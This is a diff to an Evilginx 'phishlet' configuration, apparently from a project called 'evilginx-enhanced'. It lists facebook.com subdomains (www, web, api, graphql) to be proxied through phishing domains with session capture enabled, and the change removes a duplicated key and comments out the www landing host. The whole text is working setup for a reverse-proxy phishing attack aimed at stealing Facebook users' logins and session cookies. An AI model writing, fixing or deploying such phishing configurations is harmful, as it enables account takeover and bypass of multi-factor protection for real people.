@@ -1,8 +1,7 @@
 author: 'evilginx-enhanced'
 min_ver: '3.0.0'
 proxy_hosts:
-  - {phish_sub: 'www', orig_sub: 'www', domain: 'facebook.com', session: true, is_landing: true}
-proxy_hosts:
+  # - {phish_sub: 'www', orig_sub: 'www', domain: 'facebook.com', session: true, is_landing: true}
   - {phish_sub: 'web', orig_sub: 'web', domain: 'facebook.com', session: true}
   - {phish_sub: 'api', orig_sub: 'api', domain: 'facebook.com', session: false}
   - {phish_sub: 'graphql', orig_sub: 'graphql', domain: 'facebook.com', session: false}
